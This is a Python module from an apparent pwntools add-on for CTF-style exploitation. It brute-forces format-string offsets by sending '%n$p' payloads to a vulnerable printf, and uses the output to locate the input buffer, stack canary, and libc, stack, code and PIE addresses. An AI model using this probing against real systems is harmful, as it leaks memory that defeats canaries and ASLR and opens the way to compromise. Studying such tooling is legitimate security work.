'''Offset bruteforcers for format string bugs
----------------------------------------------
note: 'offset' refers to the `n` in
    %n$m
when dealing with printf exploitation.
----------------------------------------------
To use any of the functions here, you should
predefine a function that fsb.find_offset can
interact with. If a binary has code like:

    int main(){
        char s[200];
        fgets(s, 199, stdin);
        printf(s);
    }

fsb.find_offset needs a function that can
abstract away the i/o of the binary:

    def printf_io(send: str) -> bytes:
        r = remote(...)
        r.send(send)
        return r.recvline()

Then, we can use the io function to find, e.g.
the offset of the stack canary:

>>> fsb.find_offset.canary(printf_io)
31
'''
from re import findall
from typing import Callable, Optional
from functools import wraps, partial
from pwnlib.log import getLogger
from pwnlib.util.cyclic import cyclic, cyclic_find
from pwnlib.util.packing import p32
from pwnscripts import config
from pwnscripts.context import context
from pwnscripts.string_checks import extract_first_hex, is_canary, offset_match, is_libc_address, is_PIE_address
log = getLogger('pwnlib.exploit')
def _sendprintf(requirement: Callable[[int,Optional[str]],bool]=None, has_regex: bool=False):
    if requirement is None: return partial(_sendprintf, has_regex=has_regex)    # ???
    @wraps(requirement)
    def inner(sendprintf: Callable[[bytes],bytes], offset: int=None) -> int:
        if has_regex is False: _requirement = lambda v,_: requirement(v)
        else: _requirement = requirement
        # Actual code
        for i in range(config.PRINTF_MIN, config.PRINTF_MAX):   # an unaligned printf will fail here
            payload = 'A'*8 + '%{}$p\n'.format(i)
            extract = extract_first_hex(sendprintf(payload))    # expect @context.quiet here
            log.debug('pwnscripts: extracted ' + hex(extract))
            if extract == -1: continue
            if _requirement(extract, offset):
                log.info('%s for %r: %d' % (__name__, requirement.__name__, i))
                return i
        raise RuntimeError
    return inner
#'''
@_sendprintf
def _buffer(resp) -> int:
    expected = (0x41414141 if context.arch == 'i386' else 0x4141414141414141)
    return expected == resp

def buffer(sendprintf: Callable[[bytes],bytes], maxlen=20) -> int:
    '''Bruteforcer to locate the offset of the input string itself.
    i.e. if buffer() returns 6,
        printf("%6$d") gives the value of p32("%6$p")

    Arguments:
        `sendprintf`: a function that simulates a single printf() call.
            This is much like the function passable to pwntools' FmtStr().
            e.g.
                def printf(l: bytes):
                    r = process('./mybinary')
                    r.send(l)
                    return r.recvline()
                buffer = fsb.find_offset.buffer(printf)
        `maxlen`: the maximum length of the input. If no value
            is given, the program assumes maxlen=20.

        Larger values of `maxlen` will allow for faster offset guessing.
    '''
    # Note: if config.PRINTF_MAX becomes really large, this might break
    guess_n = (maxlen-len("0x%10$x\n")) // context.bytes
    # So long as more than 1 guess can be done at a time:
    if guess_n > 1:
        '''Let's say guess_n=3 words worth of cyclic() can be inputted.
        If config.PRINTF_MIN=5, then the first payload ought to be
            cyclic(3*context.bytes) + "0x%{}$x\n".format(5+(3-1))
        because the first guess should be able to catch any offset in the range
            range(config.PRINTF_MIN, config.PRINTF_MIN+guess_n)
        '''
        for offset in range(config.PRINTF_MIN+guess_n-1, config.PRINTF_MAX+guess_n-1, guess_n):
            payload = cyclic(guess_n*context.bytes) + "0x%{}$x\n".format(offset).encode()
            extract = extract_first_hex(sendprintf(payload))    # Error will be -1
            if extract != -1 and 0 <= (found := cyclic_find(p32(extract))) < len(payload):
                assert found%context.bytes == 0 # if not, the offset is non-aligned
                log.info('%s for buffer: %d' % (__name__, offset-found//context.bytes))
                return offset-found//context.bytes
        raise RuntimeError  # Give up
    # else: use default bruteforcer
    return _buffer(sendprintf)
@_sendprintf
def canary(resp) -> int:
    '''heuristic-based bruteforcer to find the offset of a stack canary.
    
    In particular, a word matching
        word[-1]=='\\0' AND word.count('\\0')==1
        AND NOT looks_like_address()
    will be assumed a canary.
    '''
    return is_canary(resp)

@_sendprintf
def stack(resp) -> int:
    '''heuristic-based bruteforcer to find a stack address

    Pattern matches for 0x7ff.{9} in amd64.
    '''
    if context.arch != 'amd64':
        raise NotImplementedError
    return findall('0x7ff.........', hex(resp)) != []

@_sendprintf(has_regex=True)
def libc(resp: int, offset: int=None) -> int:
    '''pattern-matcher for a libc address with an offset of `offset`
    This function is _not_ integrated with libc_db; it simply does a offset check
    for libc addresses, plus the `offset` given.
    An offset of `None` will simply pattern-match for any generic libc-ish address
    '''
    return is_libc_address(resp) and offset_match(resp, offset)

@_sendprintf(has_regex=True)
def code(resp: int, offset: int=None) -> int:
    '''heuristic-based bruteforcer for non-PIE code addresses.
    Simply put, any value matching
        '0x804.{4}' (on i386)
        '0x40.{4}'  (on amd64)
    will be considered a code address.
    
    An `offset` can be provided to further narrow down the search to
    code addresses matching the offset given.'''
    return findall({'i386': '0x804....', 'amd64': '0x40....'}[context.arch], hex(resp)) != [] and\
           offset_match(resp, offset)

@_sendprintf(has_regex=True)
def PIE(resp: int, offset: int=None) -> int:
    '''heuristic-based bruteforcer for PIE code addresses.
    Simply put, any value matching
        '0x56.*' (on i386)
        '0x55.*'  (on amd64)
    will be considered a code address.
    
    An `offset` can be provided to further narrow down the search to
    code addresses matching the offset given.'''
    return is_PIE_address(resp) and offset_match(resp, offset)
